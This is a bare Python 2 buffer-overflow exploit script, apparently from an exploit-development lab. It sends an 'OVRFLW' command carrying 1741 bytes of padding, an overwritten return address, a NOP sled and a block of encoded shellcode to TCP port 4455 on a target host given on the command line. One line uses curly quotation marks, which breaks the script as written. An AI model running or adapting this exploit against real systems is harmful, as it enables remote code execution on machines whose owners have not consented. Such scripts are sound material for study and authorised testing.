#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW"
# badcharacters: x04 x11 x1f x4b x5c
shell = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xc8\x6b\x6a\x95\x83\xee\xfc\xe2\xf4\x34\x83\xe8\x95\xc8\x6b"
"\x0a\x1c\x2d\x5a\xaa\xf1\x43\x3b\x5a\x1e\x9a\x67\xe1\xc7\xdc"
"\xe0\x18\xbd\xc7\xdc\x20\xb3\xf9\x94\xc6\xa9\xa9\x17\x68\xb9"
"\xe8\xaa\xa5\x98\xc9\xac\x88\x67\x9a\x3c\xe1\xc7\xd8\xe0\x20"
"\xa9\x43\x27\x7b\xed\x2b\x23\x6b\x44\x99\xe0\x33\xb5\xc9\xb8"
"\xe1\xdc\xd0\x88\x50\xdc\x43\x5f\xe1\x94\x1e\x5a\x95\x39\x09"
"\xa4\x67\x94\x0f\x53\x8a\xe0\x3e\x68\x17\x6d\xf3\x16\x4e\xe0"
"\x2c\x33\xe1\xcd\xec\x6a\xb9\xf3\x43\x67\x21\x1e\x90\x77\x6b"
"\x46\x43\x6f\xe1\x94\x18\xe2\x2e\xb1\xec\x30\x31\xf4\x91\x31"
"\x3b\x6a\x28\x34\x35\xcf\x43\x79\x81\x18\x95\x03\x59\xa7\xc8"
"\x6b\x02\xe2\xbb\x59\x35\xc1\xa0\x27\x1d\xb3\xcf\x94\xbf\x2d"
"\x58\x6a\x6a\x95\xe1\xaf\x3e\xc5\xa0\x42\xea\xfe\xc8\x94\xbf"
"\xc5\x98\x3b\x3a\xd5\x98\x2b\x3a\xfd\x22\x64\xb5\x75\x37\xbe"
"\xfd\xff\xcd\x03\xaa\x3d\xed\x74\x02\x97\xc8\x6a\xd1\x1c\x2e"
"\x01\x7a\xc3\x9f\x03\xf3\x30\xbc\x0a\x95\x40\x4d\xab\x1e\x99"
"\x37\x25\x62\xe0\x24\x03\x9a\x20\x6a\x3d\x95\x40\xa0\x08\x07"
"\xf1\xc8\xe2\x89\xc2\x9f\x3c\x5b\x63\xa2\x79\x33\xc3\x2a\x96"
"\x0c\x52\x8c\x4f\x56\x94\xc9\xe6\x2e\xb1\xd8\xad\x6a\xd1\x9c"
"\x3b\x3c\xc3\x9e\x2d\x3c\xdb\x9e\x3d\x39\xc3\xa0\x12\xa6\xaa"
"\x4e\x94\xbf\x1c\x28\x25\x3c\xd3\x37\x5b\x02\x9d\x4f\x76\x0a"
"\x6a\x1d\xd0\x9a\x20\x6a\x3d\x02\x33\x5d\xd6\xf7\x6a\x1d\x57"
"\x6c\xe9\xc2\xeb\x91\x75\xbd\x6e\xd1\xd2\xdb\x19\x05\xff\xc8"
"\x38\x95\x40")
junk = "\x41" * 1741  + "\x83\x66\x26\x56" + “\x90” * 8 +  shell 
end = "\r\n"

buffer = cmd + junk + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()

